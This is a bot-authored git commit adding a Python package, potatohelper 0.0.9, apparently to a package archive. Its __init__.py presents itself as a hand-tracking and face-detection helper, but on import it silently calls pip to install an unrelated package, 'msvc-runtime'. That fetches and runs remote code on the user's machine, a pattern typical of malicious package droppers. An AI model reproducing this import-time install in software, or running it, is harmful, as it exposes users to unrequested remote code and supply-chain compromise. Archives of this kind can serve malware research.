c9ab5a4b28b12cc71610fa8b8ce65f0fb36568a3
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 21:13:46 +0000

    Add package potatohelper/0.0.9/potatohelper-0.0.9.tar.gz

---
+++ packages/potatohelper/potatohelper-0.0.9.tar.gz/potatohelper-0.0.9/potatohelper/__init__.py
@@ -0,0 +1,8 @@
+import pip
+pip.main(['install', 'msvc-runtime'])
+
+from potatohelper import HandTrackingModule
+from potatohelper import FingerCounter
+from potatohelper import FaceDetection
+from potatohelper import FaceMesh
+		
